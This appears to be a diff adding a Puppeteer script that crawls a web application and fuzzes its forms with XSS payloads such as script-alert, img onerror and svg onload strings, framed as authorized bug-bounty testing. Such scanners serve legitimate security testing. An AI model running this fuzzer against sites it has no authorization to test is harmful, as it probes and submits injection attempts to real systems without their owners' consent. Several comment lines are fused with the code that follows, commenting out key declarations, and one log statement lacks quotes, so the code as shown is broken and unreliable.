@@ -1,0 +1,222 @@
+import puppeteer from 'puppeteer';
+import crypto from 'crypto';
+// ==========================================// 🛠️ PROGRAM CONFIGURATION// ==========================================const START_URL = 'https://example.com'; // Change this to your authorized target assetconst MAX_DEPTH = 3;                     // Prevent crawler from venturing out infinitelyconst RESEARCH_HEADER_USER = 'your_h1_username'; // Banco Plata mandatory tracking profile
+// Comprehensive XSS Fuzzing Matrixconst XSS_PAYLOADS = [
+    '"><script>alert(document.domain)</script>',
+    'javascript:alert(1)',
+    '<img src=x onerror=alert(1)>',
+    '\'"--><svg/onload=alert(1)>'
+];
+// Global Directed Graph State Registriesconst visitedStates = new Set();const stateQueue = []; // Breadth-First Search Queue
+/**
+ * Math in Action: Structural Graph Fingerprinting
+ * Converts the DOM architecture layout into a tracking hash to verify the exact state context.
+ * This effectively blocks infinite trap loops like dynamic calendar components.
+ */async function getPageFingerprint(page) {
+    const url = await page.url();
+    
+    // Abstract the DOM by extracting structural tags exclusively, removing dynamic string content
+    const domStructure = await page.evaluate(() => {
+        return Array.from(document.querySelectorAll('*'))
+            .map(el => el.tagName)
+            .join(',');
+    });
+    
+    const hash = crypto.createHash('sha256')
+        .update(`${url}|${domStructure}`)
+        .digest('hex');
+    return { hash, url };
+}
+/**
+ * XSS & Exception Interception Context
+ * Attaches real-time evaluation observers to capture malicious DOM manipulation events.
+ */async function setupSecurityListeners(page) {
+    page.on('dialog', async dialog => {
+        if (dialog.type() === 'alert' || dialog.type() === 'confirm') {
+            console.log(`\n[🔥 XSS BUG FOUND] Vulnerability confirmed via alert/confirm dialogue context!`);
+            console.log(`[📍 Verification Node] Location URL: ${await page.url()}`);
+            console.log(`[💬 Message Content] Value: "${dialog.message()}"\n`);
+            await dialog.dismiss();
+        }
+    });
+
+    page.on('pageerror', error => {
+        // Monitors for anomalies that reveal incomplete input processing or internal DOM corruption
+        if (error.message.includes('XSS') || error.message.includes('Unexpected token')) {
+            console.log(`[⚠️ DOM Execution Exception] Observed structural mutation failure: ${error.message}`);
+        }
+    });
+}
+/**
+ * Directed Graph State-Edge Discovery
+ * Extracts elements capable of inducing state modifications (Edges).
+ */async function discoverEdges(page) {
+    return await page.evaluate(() => {
+        const elements = document.querySelectorAll('a, button, input[type="submit"], [role="button"]');
+        return Array.from(elements).map((el, index) => {
+            return {
+                index,
+                tagName: el.tagName,
+                id: el.id || '',
+                className: el.className || '',
+                text: el.innerText ? el.innerText.substring(0, 15).trim() : ''
+            };
+        });
+    });
+}
+/**
+ * Graph Traversal and Mutation Engine
+ * Evaluates the node, runs automated form fuzzing, and registers subsequent structural states.
+ */async function exploreNode(browser, stateNode) {
+    const { url, depth, actionsHistory } = stateNode;
+    
+    if (depth > MAX_DEPTH) return;
+
+    console.log(`[🔍 Graph Exploration] Depth: ${depth} | Transitioning to Node: ${url}`);
+    
+    const page = await browser.newPage();
+    
+    // Adheres to Banco Plata platform requirements for research session verification
+    await page.setExtraHTTPHeaders({
+        'X-HackerOne-Research': RESEARCH_HEADER_USER
+    });
+
+    try {
+        await setupSecurityListeners(page);
+        await page.goto(url, { waitUntil: 'networkidle2', timeout: 12000 });
+
+        // --- SECTION 1: REPLAY STATE HISTORY ---
+        // For processing nested complex FSM workflows (e.g., Guest -> Premium Checkout -> Failed Payment)
+        for (const action of actionsHistory) {
+            if (action.type === 'click') {
+                await page.evaluate((idx) => {
+                    const el = document.querySelectorAll('a, button, input[type="submit"], [role="button"]')[idx];
+                    if (el) el.click();
+                }, action.selectorIndex);
+                await page.evaluate(() => new Promise(resolve => setTimeout(resolve, 800)));
+            }
+        }
+
+        // --- SECTION 2: AUTOMATED FORM SUBMISSION AND FUZZING ---
+        const formsCount = await page.evaluate(() => document.querySelectorAll('form').length);
+        if (formsCount > 0) {
+            console.log(`   [📝 Form Engine] Detected ${formsCount} interactive form elements on this node.`);
+            
+            for (let formIndex = 0; formIndex < formsCount; formIndex++) {
+                for (const payload of XSS_PAYLOADS) {
+                    
+                    // Framework-Safe Injection: Synthesizes input events for React/Vue/Angular engines
+                    const isFormSubmitted = await page.evaluate((fIdx, currentPayload) => {
+                        const form = document.querySelectorAll('form')[fIdx];
+                        if (!form) return false;
+
+                        const inputTargets = form.querySelectorAll('input[type="text"], input[type="search"], input[type="email"], textarea');
+                        if (inputTargets.length === 0) return false;
+
+                        inputTargets.forEach(input => {
+                            input.value = currentPayload;
+                            // Enforce DOM element event bubbling so modern app frameworks update their virtual states
+                            input.dispatchEvent(new Event('input', { bubbles: true }));
+                            input.dispatchEvent(new Event('change', { bubbles: true }));
+                        });
+
+                        // Programmatic submission fallback if standard UI target buttons are missed
+                        const submitButton = form.querySelector('button[type="submit"], input[type="submit"]');
+                        if (submitButton) {
+                            submitButton.click();
+                        } else {
+                            form.submit();
+                        }
+                        return true;
+                    }, formIndex, payload);
+
+                    if (isFormSubmitted) {
+                        console.log(`   [🚀 Injection Fired] Form [Index: ${formIndex}] populated with payload: [${payload.substring(0, 22)}]`);
+                        
+                        // Give the mutation state time to clear background async callbacks
+                        await page.evaluate(() => new Promise(resolve => setTimeout(resolve, 1500)));
+                        
+                        // Determine if form redirection landed the browser on a brand-new distinct structural graph node
+                        const postSubmitFingerprint = await getPageFingerprint(page);
+                        if (!visitedStates.has(postSubmitFingerprint.hash)) {
+                            visitedStates.add(postSubmitFingerprint.hash);
+                            const currentLandingUrl = await page.url();
+                            
+                            console.log(`   [🆕 New State Discovered] Form execution uncovered a new state view node: ${currentLandingUrl}`);
+                            stateQueue.push({
+                                url: currentLandingUrl,
+                                depth: depth + 1,
+                                actionsHistory: [...actionsHistory, { type: 'form_submit', description: `Form_${formIndex}_Payload` }]
+                            });
+                        }
+                        
+                        // Hard reset the automation layer to target node baseline parameters for the next validation pass
+                        await page.goto(url, { waitUntil: 'networkidle2', timeout: 10000 });
+                    }
+                }
+            }
+        }
+
+        // --- SECTION 3: GRAPH FINGERPRINT REGISTRATION ---
+        const currentFingerprint = await getPageFingerprint(page);
+        if (visitedStates.has(currentFingerprint.hash)) {
+            console.log(`   [🔄 Cycle Intercepted] Structural environment configuration matches an existing mapped node. Returning path.`);
+            await page.close();
+            return;
+        }
+        visitedStates.add(currentFingerprint.hash);
+
+        // --- SECTION 4: EDGE PROCESSING & BFS ENQUEUING ---
+        const edges = await discoverEdges(page);
+        for (const edge of edges) {
+            if (edge.tagName === 'A') {
+                const href = await page.evaluate((idx) => document.querySelectorAll('a')[idx].href, edge.index);
+                
+                // Keep the security execution localized to authorized structural endpoints 
+                if (href && href.startsWith(START_URL) && !visitedStates.has(href)) {
+                    stateQueue.push({
+                        url: href,
+                        depth: depth + 1,
+                        actionsHistory: [...actionsHistory, { type: 'click', selectorIndex: edge.index, label: `${edge.tagName}->${edge.text}` }]
+                    });
+                }
+            }
+        }
+
+    } catch (err) {
+        console.error(`[❌ Processing Error Exception] Automation faulted on ${url}: ${err.message}`);
+    } finally {
+        await page.close();
+    }
+}
+/**
+ * Master Application Coordinator
+ */async function runFSMScanner() {
+    console.log(`====================================================================`);
+    console.log(`🏁 Starting Directed Graph FSM Vulnerability Automation Engine`);
+    console.log(`📍 Baseline Application Route Target: ${START_URL}`);
+
+console.log(====================================================================\n);
+const browser = await puppeteer.launch({
+headless: true, // Toggle to false to explicitly view browser interactions in real-time
+args: ['--no-sandbox', '--disable-setuid-sandbox']
+});
+// Enqueue initial root entry vector state
+stateQueue.push({
+url: START_URL,
+depth: 0,
+actionsHistory: []
+});
+// Process nodes sequentially via Breadth-First Search strategy
+while (stateQueue.length > 0) {
+const structuralStateNode = stateQueue.shift();
+await exploreNode(browser, structuralStateNode);
+}
+console.log('\n====================================================================');
+console.log('🏁 Application Directed Graph mapping finalized successfully.');
+console.log('====================================================================');
+await browser.close();
+}
+runFSMScanner();
+
+
